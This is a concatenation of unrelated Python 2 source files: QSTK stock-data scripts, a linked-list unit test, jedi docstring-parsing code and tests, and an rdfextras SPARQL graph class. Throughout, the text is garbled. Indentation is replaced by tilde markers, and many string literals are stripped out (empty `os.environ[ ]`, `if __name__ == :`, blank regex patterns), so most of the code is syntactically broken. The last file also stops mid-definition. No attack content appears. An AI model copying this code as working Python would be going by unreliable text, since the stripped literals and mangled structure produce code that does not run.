~~ \'\'\'\nCreated on Jun 1, 2010\n\n@author: Shreyas Joshi\n@summary: The purpose of this module is to make it easy to create hdf5 files with "alpha" values in them\n\'\'\' \n 
import tables as pt \n 
fileName = "defaultAlphaFileName.h5" \n 
h5f = [ ] \n 
group = [ ] \n 
table = [ ] \n 
opened = False \n 
ctr = float ( 0.0 ) \n 
\n 
class AlphaDataModelClass ( pt . IsDescription ) : \n 
~~~ symbol = pt . StringCol ( 30 ) \n 
exchange = pt . StringCol ( 10 ) \n 
alphaValue = pt . Float32Col ( ) \n 
timestamp = pt . Time64Col ( ) \n 
\n 
\n 
\n 
def __init__ ( self ) : \n 
~~~ print "In the AlphaDataModelClass constructor" \n 
\n 
#constructor done \n 
#class ends! \n 
\n 
\n 
~~ ~~ def openFile ( newFileName ) : \n 
~~~ \'\'\'\n        @param newFileName: Full path to the file and the name of the file.\n        @summary: This function creates a new file. If the length of the name passed =0 then a file called "defaultAlphaFileName.h5" will be created.\n        @warning: If a file of the same name already exists then that file will be overwritten.\n        \'\'\' \n 
global fileName , h5f , group , table , opened , ctr \n 
ctr = float ( 0.0 ) \n 
\n 
if newFileName is None : \n 
~~~ print "Using default name for alpha file" \n 
~~ else : \n 
~~~ if ( len ( newFileName ) > 0 ) : \n 
~~~ fileName = str ( newFileName ) \n 
~~ else : \n 
~~~ print "Using default name for alpha file" \n 
\n 
#Opening the file now... \n 
~~ ~~ if not opened : \n 
~~~ h5f = pt . openFile ( str ( fileName ) , mode = "w" ) \n 
group = h5f . createGroup ( "/" , ) \n 
table = h5f . createTable ( group , , AlphaDataModelClass ) \n 
opened = True \n 
~~ else : \n 
~~~ print "File already opened. Doing nothing" \n 
\n 
# File opened     \n 
\n 
~~ ~~ def addRow ( currSymbol , currExchange , currAlphaVal , currTS ) : \n 
~~~ \n 
global ctr \n 
\n 
if opened : \n 
~~~ ctr = ctr + 1 \n 
row = table . row \n 
row [ ] = currSymbol \n 
row [ ] = currExchange \n 
row [ ] = currAlphaVal \n 
row [ ] = currTS \n 
row . append ( ) \n 
#print "Appending row " + str (currTS) \n 
if ( ctr == 10000 ) : #Might cause mem error \n 
~~~ ctr = 0 \n 
table . flush ( ) #write to disk \n 
\n 
\n 
\n 
~~ ~~ else : \n 
~~~ print "ERROR: File not open. Can not add row." \n 
raise IOError \n 
#    addRow done \n 
\n 
\n 
#def readAllData(): \n 
##  global h5f \n 
##  table2 = h5f.root.alphaData.alphaData \n 
#   \n 
#  for row in table.iterrows():  #for row in table2.iterrows(): \n 
#      print "SYM: "+str(row[\'symbol\'])+", EX: "+ str(row[\'exchange\'])+", ALPHA: "+str(row[\'alphaValue\'])+", TIMESTAMP: "+str(row[\'timestamp\']) \n 
\n 
~~ ~~ def closeFile ( ) : \n 
~~~ \n 
\n 
table . flush ( ) \n 
h5f . close ( ) \n 
print str ( fileName ) + " closed." \n 
opened = False \n 
\n 
~~ import numpy as np \n 
import pickle as pkl \n 
import qstkutil . utils as utils \n 
import os \n 
import dircache \n 
import time \n 
import sys \n 
\n 
\n 
def main ( ) : \n 
\n 
~~~ print "Starting..." + str ( time . strftime ( "%H:%M:%S" ) ) \n 
\n 
try : \n 
~~~ rootdir = os . environ [ ] \n 
~~ except KeyError : \n 
#rootdir = "/hzr71/research/QSData" \n 
~~~ print "Please be sure to set the value for QSDATA in config.sh or local.sh\\n" \n 
\n 
~~ fileExtensionToRemove = ".csv" \n 
\n 
listOfInputPaths = list ( ) \n 
\n 
\n 
#For Gekko \n 
#listOfInputPaths.append("/hzr71/research/QSData/Processed/Norgate/raw/Delisted Securities/US Recent/") listOfInputPaths . append ( rootdir + "/Raw/Yahoo/US/AMEX/" ) \n 
listOfInputPaths . append ( rootdir + "/Raw/Yahoo/US/NASDAQ/" ) \n 
listOfInputPaths . append ( rootdir + "/Raw/Yahoo/US/NYSE/" ) \n 
\n 
\n 
\n 
listOfOutputPaths = list ( ) \n 
#    listOfOutputPaths.append("C:\\\\test\\\\temp\\\\pkl1\\\\") \n 
#    listOfOutputPaths.append("C:\\\\test\\\\temp\\\\pkl2\\\\")     \n 
\n 
#listOfOutputPaths.append(rootdir + "/Norgate/Delisted Securities/US Recent/") \n 
listOfOutputPaths . append ( rootdir + "/Processed/Yahoo/US/AMEX/" ) \n 
listOfOutputPaths . append ( rootdir + "/Processed/Yahoo/US/NASDAQ/" ) \n 
listOfOutputPaths . append ( rootdir + "/Processed/Yahoo/US/NYSE/" ) \n 
\n 
\n 
for path in listOfOutputPaths : \n 
~~~ if not ( os . access ( path , os . F_OK ) ) : \n 
#Path does not exist, so create it \n 
~~~ os . makedirs ( path ) #Makes paths recursively \n 
#done making all output paths! \n 
\n 
#In case there are already some files there- remove them. This will remove all the pkl fils from the previous run ~~ ~~ utils . clean_paths ( listOfOutputPaths ) \n 
\n 
\n 
if ( len ( listOfInputPaths ) != len ( listOfOutputPaths ) ) : \n 
~~~ print "No. of input paths not equal to the number of output paths.. quitting" \n 
sys . exit ( "FAILURE" ) \n 
#if ends \n 
\n 
~~ path_ctr = - 1 ; \n 
use_cols = range ( 1 , 7 + 1 ) # will now use cols 1 to 7 \n 
for path in listOfInputPaths : \n 
~~~ path_ctr = path_ctr + 1 ; \n 
stocks_at_this_path = dircache . listdir ( str ( path ) ) \n 
filtered_names = filter ( lambda x : ( str ( x ) . find ( str ( fileExtensionToRemove ) ) > - 1 ) , stocks_at_this_path #Now, we remove the .csv to get the name of the stock \n 
filtered_names = map ( lambda x : ( x . partition ( str ( fileExtensionToRemove ) ) [ 0 ] ) , filtered_names ) \n 
stock_ctr = - 1 \n 
for stock in filtered_names : \n 
~~~ stock_ctr = stock_ctr + 1 \n 
print "Reading file: " + str ( path + stock ) \n 
#read in the stock date from the CSV file \n 
stock_data = np . loadtxt ( path + stock + ".csv" , np . float , None , "," , None , 1 , use_cols ) \n 
\n 
stock_data_shape = stock_data . shape \n 
#print "stock_data_shape is: " + str(stock_data_shape) \n 
\n 
\n 
#            for i in range (0, stock_data_shape[0]): \n 
#                print stock_data [i,: ] \n 
\n 
#            print "Reading: " + str(stock) \n 
f = open ( listOfOutputPaths [ path_ctr ] + filtered_names [ stock_ctr ] + ".pkl" , "wb" ) \n 
pkl . dump ( stock_data , f , - 1 ) \n 
f . close ( ) \n 
#for stock in stocks_at_this_path ends \n 
#for path in listOfInputPaths ends \n 
~~ ~~ print "Finished..." + str ( time . strftime ( "%H:%M:%S" ) ) \n 
\n 
#main ends \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ main ( ) \n 
\n 
\n 
# OneStock.py \n 
# \n 
\n 
# \n 
# A strategy script which creates a daily allocation table using one stock (GOOG) \n 
# and the start and end dates provided by the user. \n 
# It then dumps the allocation table to a pickle file. \n 
# \n 
# \n 
\n 
# python imports \n 
~~ import cPickle \n 
import sys \n 
from pandas import DataMatrix \n 
import datetime as dt \n 
import random \n 
\n 
# qstk imports \n 
import qstkutil . DataAccess as da \n 
import qstkutil . qsdateutil as du \n 
\n 
if __name__ == "__main__" : \n 
~~~ print "Running One Stock strategy from " + sys . argv [ 1 ] + " to " + sys . argv [ 2 ] \n 
\n 
# Use google symbol \n 
symbols = list ( [ ] ) \n 
\n 
# Set start and end dates \n 
t = map ( int , sys . argv [ 1 ] . split ( ) ) \n 
startday = dt . datetime ( t [ 2 ] , t [ 0 ] , t [ 1 ] ) \n 
t = map ( int , sys . argv [ 2 ] . split ( ) ) \n 
endday = dt . datetime ( t [ 2 ] , t [ 0 ] , t [ 1 ] ) \n 
\n 
# Get desired timestamps \n 
timeofday = dt . timedelta ( hours = 16 ) \n 
timestamps = du . getNYSEdays ( startday , endday , timeofday ) \n 
\n 
# Get the data from the data store \n 
dataobj = da . DataAccess ( ) \n 
historic = dataobj . get_data ( timestamps , symbols , "close" ) \n 
\n 
# Setup the allocation table \n 
alloc_val = random . random ( ) \n 
alloc = DataMatrix ( index = [ historic . index [ 0 ] ] , data = [ alloc_val ] , columns = symbols ) \n 
for date in range ( 1 , len ( historic . index ) ) : \n 
~~~ alloc_val = 1 #random.random() \n 
alloc = alloc . append ( DataMatrix ( index = [ historic . index [ date ] ] , data = [ alloc_val ] , columns = [ symbols ~~ alloc [ ] = 1 - alloc [ symbols [ 0 ] ] \n 
\n 
# Dump to pkl file \n 
output = open ( sys . argv [ 3 ] , "wb" ) \n 
cPickle . dump ( alloc , output ) \n 
~~ \'\'\'\nCreated on Jun 1, 2010\n\n@author: Shreyas Joshi\n@summary: Just a quick way to test the DataAccess class... nothing more "I dare do all that may become a DataAccessTester. Who dares do more is none"\n\'\'\' \n 
\n 
#Due to the momentary lack of a HDF viewer that installs/works without hassle- I decided to write a little something to check if the alpha  #values were being written properly \n 
\n 
#Main begins \n 
#from DataAccess import * \n 
#import DataAccessNew as da \n 
import QSTK . qstkutil . DataAccess as da \n 
import tables as pt \n 
import numpy as np \n 
from itertools import izip \n 
import time \n 
import dircache \n 
\n 
def getStocks ( listOfPaths ) : \n 
\n 
~~~ listOfStocks = list ( ) \n 
#Path does not exist \n 
print "Reading in all stock names..." \n 
fileExtensionToRemove = ".h5" \n 
\n 
for path in listOfPaths : \n 
~~~ stocksAtThisPath = list ( ) \n 
\n 
stocksAtThisPath = dircache . listdir ( str ( path ) ) \n 
#Next, throw away everything that is not a .h5 And these are our stocks! \n 
stocksAtThisPath = filter ( lambda x : ( str ( x ) . find ( str ( fileExtensionToRemove ) ) > - 1 ) , stocksAtThisPath #Now, we remove the .h5 to get the name of the stock \n 
stocksAtThisPath = map ( lambda x : ( x . partition ( str ( fileExtensionToRemove ) ) [ 0 ] ) , stocksAtThisPath \n 
for stock in stocksAtThisPath : \n 
~~~ listOfStocks . append ( stock ) \n 
~~ return listOfStocks \n 
#readStocksFromFile done \n 
\n 
\n 
\n 
\n 
~~ ~~ if __name__ == : \n 
\n 
~~~ print "Starting..." \n 
dataItemsList = [ ] \n 
\n 
dataItemsList . append ( ) \n 
\n 
\n 
\n 
\n 
\n 
#for gekko \n 
#listOfPaths.append("/hzr71/research/QSData/Processed/Norgate/Equities/US_NASDAQ/") \n 
#listOfPaths.append("/hzr71/research/QSData/Processed/Norgate/Equities/Delisted_US_Recent/") \n 
#listOfPaths.append("/hzr71/research/QSData/Processed/Norgate/Equities/OTC/") \n 
#listOfPaths.append("/hzr71/research/QSData/Processed/Norgate/Equities/US_AMEX/") \n 
#listOfPaths.append("/hzr71/research/QSData/Processed/Norgate/Equities/US_Delisted/") \n 
#listOfPaths.append("/hzr71/research/QSData/Processed/Norgate/Equities/US_NYSE/") \n 
#listOfPaths.append("/hzr71/research/QSData/Processed/Norgate/Equities/US_NYSE Arca/") \n 
#gekko paths end \n 
\n 
\n 
\n 
listOfStocks = list ( ) \n 
#listOfStocks.append("AAPL") \n 
#listOfStocks.append("YHOO") \n 
#listOfStocks.append("AMZN") \n 
\n 
listOfPaths = list ( ) \n 
listOfPaths . append ( "C:\\\\test\\\\temp\\\\" ) \n 
#listOfPaths.append("C:\\\\test\\\\hdf\\\\") \n 
\n 
listOfStocks = getStocks ( listOfPaths ) \n 
\n 
\n 
\n 
\n 
alpha = da . DataAccess ( True , listOfPaths , "/StrategyData" , "StrategyData" , True , listOfStocks ) # , 946702800 , 1262322000  \n 
#alpha= da.DataAccess (False, "C:\\\\test\\\\temp\\\\AAPL.h5", "/StrategyData", "StrategyData", True, None) # reading a single hdf5 file \n 
tslist = list ( alpha . getTimestampArray ( ) ) \n 
\n 
#for ts in tslist: \n 
#    for stock in listOfStocks: \n 
#        print str(stock)+"  "+ str(ts)+"   "+str(alpha.getStockDataItem(str(stock), \'volume\', ts))  \n 
\n 
\n 
\n 
#alpha= da.DataAccess (False, "curveFittingAlphaVals.h5", "/alphaData", "alphaData", True, listOfStocks, None, None, None, dataItemsList) \n 
\n 
listOfTS = alpha . getTimestampArray ( ) \n 
for stock in [ "AAPL" ] : \n 
~~~ alphaList = alpha . getStockDataList ( stock , ) \n 
ctr = 0 \n 
for val in alphaList : \n 
~~~ print "stock: " + str ( stock ) + ", val: " + str ( val ) + ", ts: " + str ( listOfTS [ ctr ] ) \n 
ctr += 1 \n 
\n 
~~ ~~ print "DONE!" \n 
~~ import unittest \n 
import collections_and_iterators \n 
\n 
""" Collections - TESTS \n    Testing Collections programming examples from collections.py \n\n    Gabby Ortman \n""" \n 
\n 
class TestObjectMethods ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . singleLinkList = collections_and_iterators . SinglyLinkedList ( ) \n 
\n 
self . singleLinkListData = collections_and_iterators . SinglyLinkedList ( ) \n 
self . singleLinkListData . append ( "Cosmo" ) \n 
self . singleLinkListData . append ( "Allie" ) \n 
self . singleLinkListData . append ( "Watson" ) \n 
\n 
self . doubleLinkList = collections_and_iterators . DoublyLinkedList ( ) \n 
self . doubleLinkListData = collections_and_iterators . DoublyLinkedList ( ) \n 
\n 
self . doubleLinkListData . append ( "COM S 228" ) \n 
self . doubleLinkListData . append ( "PHIL 343" ) \n 
self . doubleLinkListData . append ( "COM S 444" ) \n 
\n 
#test that a newly initialized singly linked list has size 0, null head and null cursor \n 
~~ def test_empty_single_list ( self ) : \n 
~~~ self . assertEqual ( 0 , self . singleLinkList . size ) \n 
self . assertIsNone ( self . singleLinkList . head ) \n 
self . assertIsNone ( self . singleLinkList . cursor ) \n 
\n 
#__contains__ should return true if the list contains specified data  \n 
~~ def test_contains_success ( self ) : \n 
~~~ self . assertTrue ( "Cosmo" in self . singleLinkListData ) \n 
self . assertTrue ( "Allie" in self . singleLinkListData ) \n 
self . assertTrue ( "Watson" in self . singleLinkListData ) \n 
\n 
#__contains should return false if the list does not contained specified data, d u h  \n 
~~ def test_contains_failure ( self ) : \n 
~~~ self . assertFalse ( "Gabby" in self . singleLinkListData ) \n 
self . assertFalse ( "Thomas" in self . singleLinkListData ) \n 
\n 
#append should add data to the end of the list \n 
~~ def test_append_success ( self ) : \n 
~~~ self . assertEqual ( "Cosmo" , self . singleLinkListData [ 0 ] ) \n 
self . assertEqual ( "Allie" , self . singleLinkListData [ 1 ] ) \n 
self . assertEqual ( "Watson" , self . singleLinkListData [ 2 ] ) \n 
\n 
#append should raise an exception when trying to  \n 
~~ def test_append_failure ( self ) : \n 
~~~ with self . assertRaises ( IndexError ) : \n 
~~~ self . singleLinkListData [ 3 ] \n 
~~ self . singleLinkListData . append ( "Foley" ) \n 
self . assertEqual ( "Foley" , self . singleLinkListData [ 3 ] ) \n 
\n 
#__getitem__ should get the data at the specified index unless the specified index is out of bounds. then it should throw an exception ~~ def test_getitem_success ( self ) : \n 
~~~ self . assertEqual ( "Cosmo" , self . singleLinkListData . __getitem__ ( 0 ) ) \n 
self . assertEqual ( "Allie" , self . singleLinkListData . __getitem__ ( 1 ) ) \n 
self . assertEqual ( "Watson" , self . singleLinkListData . __getitem__ ( 2 ) ) \n 
\n 
~~ def test_getitem_failure ( self ) : \n 
~~~ with self . assertRaises ( IndexError ) : \n 
~~~ self . singleLinkListData . __getitem__ ( 3 ) \n 
self . singleLinkListData . __getitem__ ( - 3 ) \n 
\n 
#__setitem__ should change the data at a given index \n 
~~ ~~ def test_setitem_success ( self ) : \n 
~~~ self . assertEqual ( "Cosmo" , self . singleLinkListData [ 0 ] ) \n 
self . singleLinkListData [ 0 ] = "Smalls" \n 
self . assertEqual ( "Smalls" , self . singleLinkListData [ 0 ] ) \n 
\n 
#__setitem__ should raise an exception when trying to access an element that does not exist  \n 
~~ def test_setitem_failure ( self ) : \n 
~~~ with self . assertRaises ( IndexError ) : \n 
~~~ self . singleLinkListData [ 5 ] = "Bruno" \n 
self . singleLinkListData [ - 1 ] = "Lucie" \n 
\n 
#test that a newly initialized doubly linked list has size 0, null head and null cursor  \n 
~~ ~~ def test_empty_double_list ( self ) : \n 
~~~ self . assertEqual ( 0 , self . doubleLinkList . size ) \n 
self . assertIsNone ( self . doubleLinkList . head ) \n 
self . assertIsNone ( self . doubleLinkList . cursor ) \n 
\n 
~~ def test_insert_success ( self ) : \n 
#The list should look like:  \n 
#COM S 228, PHIL 343, COM S 444 \n 
~~~ self . assertEqual ( "COM S 228" , self . doubleLinkListData [ 0 ] ) \n 
self . assertEqual ( "PHIL 343" , self . doubleLinkListData [ 1 ] ) \n 
self . assertEqual ( "COM S 444" , self . doubleLinkListData [ 2 ] ) \n 
self . doubleLinkListData . insert ( "ENGL 314" , 0 ) \n 
#Now it should look like:  \n 
#ENGL 314, COM S 228, PHIL 343, COM S 444 \n 
self . assertEqual ( "ENGL 314" , self . doubleLinkListData [ 0 ] ) \n 
self . assertEqual ( "COM S 228" , self . doubleLinkListData [ 1 ] ) \n 
self . assertEqual ( "PHIL 343" , self . doubleLinkListData [ 2 ] ) \n 
self . assertEqual ( "COM S 444" , self . doubleLinkListData [ 3 ] ) \n 
self . doubleLinkListData . insert ( "MATH 207" , 2 ) \n 
#ENGL 314, COM S 228, MATH 207, #PHIL 343, #COM S 444 \n 
self . assertEqual ( "ENGL 314" , self . doubleLinkListData [ 0 ] ) \n 
self . assertEqual ( "COM S 228" , self . doubleLinkListData [ 1 ] ) \n 
self . assertEqual ( "MATH 207" , self . doubleLinkListData [ 2 ] ) \n 
self . assertEqual ( "PHIL 343" , self . doubleLinkListData [ 3 ] ) \n 
self . assertEqual ( "COM S 444" , self . doubleLinkListData [ 4 ] ) \n 
\n 
~~ def test_insert_fauilure ( self ) : \n 
~~~ pass \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( verbosity = 2 ) \n 
~~ """\nDocstrings are another source of information for functions and classes.\n:mod:`jedi.evaluate.dynamic` tries to find all executions of functions, while\nthe docstring parsing is much easier. There are two different types of\ndocstrings that |jedi| understands:\n\n- `Sphinx <http://sphinx-doc.org/markup/desc.html#info-field-lists>`_\n- `Epydoc <http://epydoc.sourceforge.net/manual-fields.html>`_\n\nFor example, the sphinx annotation ``:type foo: str`` clearly states that the\ntype of ``foo`` is ``str``.\n\nAs an addition to parameter searching, this module also provides return\nannotations.\n""" \n 
\n 
import re \n 
from itertools import chain \n 
from textwrap import dedent \n 
\n 
from jedi . evaluate . cache import memoize_default \n 
from jedi . parser import Parser \n 
from jedi . common import indent_block \n 
\n 
DOCSTRING_PARAM_PATTERNS = [ \n 
, # Sphinx \n 
, # Epydoc \n 
] \n 
\n 
DOCSTRING_RETURN_PATTERNS = [ \n 
re . compile ( , re . M ) , # Sphinx \n 
re . compile ( , re . M ) , # Epydoc \n 
] \n 
\n 
REST_ROLE_PATTERN = re . compile ( ) \n 
\n 
\n 
@ memoize_default ( None , evaluator_is_first_arg = True ) \n 
def follow_param ( evaluator , param ) : \n 
~~~ func = param . parent_function \n 
param_str = _search_param_in_docstr ( func . raw_doc , str ( param . get_name ( ) ) ) \n 
return _evaluate_for_statement_string ( evaluator , param_str , param . get_parent_until ( ) ) \n 
\n 
\n 
~~ def _search_param_in_docstr ( docstr , param_str ) : \n 
~~~ """\n    Search `docstr` for a type of `param_str`.\n\n    >>> _search_param_in_docstr(\':type param: int\', \'param\')\n    \'int\'\n    >>> _search_param_in_docstr(\'@type param: int\', \'param\')\n    \'int\'\n    >>> _search_param_in_docstr(\n    ...   \':type param: :class:`threading.Thread`\', \'param\')\n    \'threading.Thread\'\n    >>> _search_param_in_docstr(\'no document\', \'param\') is None\n    True\n\n    """ \n 
# look at #40 to see definitions of those params \n 
patterns = [ re . compile ( p % re . escape ( param_str ) ) \n 
for p in DOCSTRING_PARAM_PATTERNS ] \n 
for pattern in patterns : \n 
~~~ match = pattern . search ( docstr ) \n 
if match : \n 
~~~ return _strip_rst_role ( match . group ( 1 ) ) \n 
\n 
~~ ~~ return None \n 
\n 
\n 
~~ def _strip_rst_role ( type_str ) : \n 
~~~ """\n    Strip off the part looks like a ReST role in `type_str`.\n\n    >>> _strip_rst_role(\':class:`ClassName`\')  # strip off :class:\n    \'ClassName\'\n    >>> _strip_rst_role(\':py:obj:`module.Object`\')  # works with domain\n    \'module.Object\'\n    >>> _strip_rst_role(\'ClassName\')  # do nothing when not ReST role\n    \'ClassName\'\n\n    See also:\n    http://sphinx-doc.org/domains.html#cross-referencing-python-objects\n\n    """ \n 
match = REST_ROLE_PATTERN . match ( type_str ) \n 
if match : \n 
~~~ return match . group ( 1 ) \n 
~~ else : \n 
~~~ return type_str \n 
\n 
\n 
~~ ~~ def _evaluate_for_statement_string ( evaluator , string , module ) : \n 
~~~ code = dedent ( """\n    def pseudo_docstring_stuff():\n        \'\'\'Create a pseudo function for docstring statements.\'\'\'\n    %s\n    """ ) \n 
if string is None : \n 
~~~ return [ ] \n 
\n 
~~ for element in re . findall ( , string ) : \n 
# Try to import module part in dotted name. \n 
\n 
~~~ string = % element + string \n 
\n 
~~ p = Parser ( code % indent_block ( string ) , no_docstr = True ) \n 
pseudo_cls = p . module . subscopes [ 0 ] \n 
try : \n 
~~~ stmt = pseudo_cls . statements [ - 1 ] \n 
~~ except IndexError : \n 
~~~ return [ ] \n 
\n 
# Use the module of the param. \n 
# TODO this module is not the module of the param in case of a function \n 
\n 
# stuffed with content from a function call. \n 
~~ pseudo_cls . parent = module \n 
definitions = evaluator . eval_statement ( stmt ) \n 
it = ( evaluator . execute ( d ) for d in definitions ) \n 
# TODO Executing tuples does not make sense, people tend to say \n 
# `(str, int)` in a type annotation, which means that it returns a tuple \n 
# with both types. \n 
\n 
# i.e. is a tuple. \n 
return list ( chain . from_iterable ( it ) ) or definitions \n 
\n 
\n 
~~ @ memoize_default ( None , evaluator_is_first_arg = True ) \n 
def find_return_types ( evaluator , func ) : \n 
~~~ def search_return_in_docstr ( code ) : \n 
~~~ for p in DOCSTRING_RETURN_PATTERNS : \n 
~~~ match = p . search ( code ) \n 
if match : \n 
~~~ return _strip_rst_role ( match . group ( 1 ) ) \n 
\n 
~~ ~~ ~~ type_str = search_return_in_docstr ( func . raw_doc ) \n 
return _evaluate_for_statement_string ( evaluator , type_str , func . get_parent_until ( ) ) \n 
~~ """\nThis is a module that imports the *standard library* unittest,\ndespite there being a local "unittest" module. It specifies that it\nwants the stdlib one with the ``absolute_import`` __future__ import.\n\nThe twisted equivalent of this module is ``twisted.trial._synctest``.\n""" \n 
from __future__ import absolute_import \n 
\n 
import unittest \n 
\n 
\n 
class Assertions ( unittest . TestCase ) : \n 
~~~ pass \n 
~~ from jedi import parser \n 
from jedi . _compatibility import u \n 
\n 
try : \n 
~~~ import unittest2 as unittest \n 
~~ except ImportError : # pragma: no cover \n 
~~~ import unittest \n 
\n 
\n 
~~ class TokenTest ( unittest . TestCase ) : \n 
~~~ def test_end_pos_one_line ( self ) : \n 
~~~ parsed = parser . Parser ( u ( \'\'\'\ndef testit():\n    a = "huhu"\n\'\'\' ) ) \n 
tok = parsed . module . subscopes [ 0 ] . statements [ 0 ] . _token_list [ 2 ] \n 
self . assertEqual ( tok . end_pos , ( 3 , 14 ) ) \n 
\n 
~~ def test_end_pos_multi_line ( self ) : \n 
~~~ parsed = parser . Parser ( u ( \'\'\'\ndef testit():\n    a = """huhu\nasdfasdf""" + "h"\n\'\'\' ) ) \n 
tok = parsed . module . subscopes [ 0 ] . statements [ 0 ] . _token_list [ 2 ] \n 
self . assertEqual ( tok . end_pos , ( 4 , 11 ) ) \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ ~~ from types import FunctionType \n 
from rdflib . graph import ConjunctiveGraph \n 
from rdflib . graph import Graph \n 
from rdflib . term import BNode \n 
from rdflib . term import Literal \n 
from rdflib . term import URIRef \n 
from rdflib . term import Variable \n 
from rdflib . namespace import NamespaceManager \n 
from rdfextras . sparql import _questChar \n 
from rdfextras . sparql import SPARQLError \n 
from rdflib . util import check_object \n 
from rdflib . util import check_subject \n 
\n 
__all__ = [ , , ] \n 
\n 
class SPARQLGraph ( object ) : \n 
~~~ """\n    A subclass of Graph with a few extra SPARQL bits.\n    """ \n 
\n 
SPARQL_DATASET = 0 \n 
NAMED_GRAPH = 1 \n 
\n 
__slots__ = ( "graphVariable" , \n 
"DAWG_DATASET_COMPLIANCE" , \n 
"identifier" , \n 
"graphKind" , \n 
"graph" ) \n 
\n 
def __init__ ( self , graph , graphVariable = None , dSCompliance = False ) : \n 
\n 
~~~ assert not graphVariable or graphVariable [ 0 ] != , repr ( graphVariable ) \n 
\n 
self . graphVariable = graphVariable \n 
self . DAWG_DATASET_COMPLIANCE = dSCompliance \n 
self . graphKind = None \n 
\n 
if graph is not None : \n 
~~~ self . graph = graph # TODO \n 
# self.store = graph.store \n 
\n 
if isinstance ( graph , ConjunctiveGraph ) : \n 
~~~ self . graphKind = self . SPARQL_DATASET \n 
self . identifier = graph . default_context . identifier \n 
\n 
~~ else : \n 
~~~ self . graphKind = self . NAMED_GRAPH \n 
self . identifier = graph . identifier \n 
\n 
#super(SPARQLGraph, self).__init__(store, identifier) \n 
\n 
~~ ~~ ~~ def setupGraph ( self , store , graphKind = None ) : \n 
~~~ gKind = graphKind and graphKind or self . graphKind \n 
self . graph = gKind ( store , self . identifier ) \n 
\n 
~~ def __reduce__ ( self ) : \n 
~~~ return ( SPARQLGraph , \n 
( None , \n 
self . graphVariable , \n 
self . DAWG_DATASET_COMPLIANCE ) , \n 
self . __getstate__ ( ) ) \n 
\n 
~~ def __getstate__ ( self ) : \n 
~~~ return ( self . graphVariable , \n 
self . DAWG_DATASET_COMPLIANCE , \n 
self . identifier ) #, \n 
# self.graphKind) \n 
\n 
~~ def __setstate__ ( self , arg ) : \n 
# gVar, flag, identifier, gKind = arg \n 
~~~ gVar , flag , identifier = arg \n 
self . graphVariable = gVar \n 
self . DAWG_DATASET_COMPLIANCE = flag \n 
self . identifier = identifier \n 
# self.graphKind = gKind \n 
# self.graph = Graph(store, identifier) \n 
\n 
\n 
########################################################################## \n 
# Clustering methods \n 
\n 
~~ def _clusterForward ( self , seed , Cluster ) : \n 
~~~ """Cluster the triple store: from a seed, transitively get all\n        properties and objects in direction of the arcs.\n\n        :param seed: RDFLib Resource\n\n        :param Cluster: a :class:`~rdfextras.sparql.graph.SPARQLGraph`\n            instance, that has to be expanded with the new arcs\n\n        """ \n 
try : \n 
# get all predicate and object pairs for the seed. \n 
# *If not yet in the new cluster, then go with a recursive round \n 
# with those* \n 
~~~ for ( p , o ) in self . graph . predicate_objects ( seed ) : \n 
\n 
~~~ if not ( seed , p , o ) in Cluster . graph : \n 
~~~ Cluster . add ( ( seed , p , o ) ) \n 
self . _clusterForward ( p , Cluster ) \n 
self . _clusterForward ( o , Cluster ) \n 
\n 
~~ ~~ ~~ except : \n 
~~~ pass \n 
\n 
\n 
~~ ~~ def clusterForward ( self , seed , Cluster = None ) : \n 
~~~ """\n        Cluster the triple store: from a seed, transitively get all\n        properties and objects in direction of the arcs.\n\n        :param seed: RDFLib Resource\n\n        :param Cluster: another sparqlGraph instance; if None, a new\n            one will be created. The subgraph will be added to this graph.\n\n        :return:  The :class:`~rdfextras.sparql.graph.SPARQLGraph` triple store\n            containing the cluster\n\n        """ \n 
if Cluster == None : \n 
~~~ Cluster = SPARQLGraph ( ) \n 
\n 
# This will raise an exception if not kosher... \n 
~~ check_subject ( seed ) #print "Wrong type for clustering: %s" % seed \n 
self . _clusterForward ( seed , Cluster ) \n 
\n 
return Cluster \n 
\n 
\n 
~~ def _clusterBackward ( self , seed , Cluster ) : \n 
~~~ """Cluster the triple store: from a seed, transitively get all\n        properties and objects in backward direction of the arcs.\n\n        :param seed: RDFLib Resource\n\n        :param Cluster: a :class:`~rdfextras.sparql.graph.SPARQLGraph`\n            instance, that has to be expanded with the new arcs\n\n        """ \n 
try : \n 
~~~ for ( s , p ) in self . graph . subject_predicates ( seed ) : \n 
\n 
~~~ if not ( s , p , seed ) in Cluster . graph : \n 
~~~ Cluster . add ( ( s , p , seed ) ) \n 
self . _clusterBackward ( s , Cluster ) \n 
self . _clusterBackward ( p , Cluster ) \n 
\n 
~~ ~~ ~~ except : \n 
~~~ pass \n 
\n 
~~ ~~ def clusterBackward ( self , seed , Cluster = None ) : \n 
~~~ """\n        Cluster the triple store: from a seed, transitively get all\n        properties and objects \'backward\', ie, following the link back\n        in the graph.\n\n        :param seed: RDFLib Resource\n\n        :param Cluster: another sparqlGraph instance; if None, a new\n            one will be created. The subgraph will be added to this graph.\n\n        :return: The :class:`~rdfextras.sparql.graph.SPARQLGraph` triple store\n            containing the cluster\n\n        """ \n 
if Cluster == None : \n 
~~~ Cluster = SPARQLGraph ( ) \n 
\n 
# This will raise an exception if not kosher... \n 
~~ check_object ( seed ) # print "Wrong type for clustering: %s" % seed \n 
self . _clusterBackward ( seed , Cluster ) \n 
\n 
return Cluster \n 
\n 
~~ def cluster ( self , seed ) : \n 
~~~ """\n        Cluster up and down, by summing up the forward and backward\n        clustering\n\n        :param seed: RDFLib Resource\n\n        :return: The :class:`~rdfextras.sparql.graph.SPARQLGraph` triple store\n            containing the cluster\n\n        """ \n 
raise "Am I getting here?" \n 
return self . clusterBackward ( seed ) + self . clusterForward ( seed ) \n 
\n 
\n 
# \n 
# \n 
# $Date: 2005/11/04 14:06:36 $, by $Author: ivan $, $Revision: 1.1 $ \n 
# \n 
~~ ~~ """\nGraph pattern class used by the SPARQL implementation\n""" \n 
\n 
def _createResource ( v ) : \n 
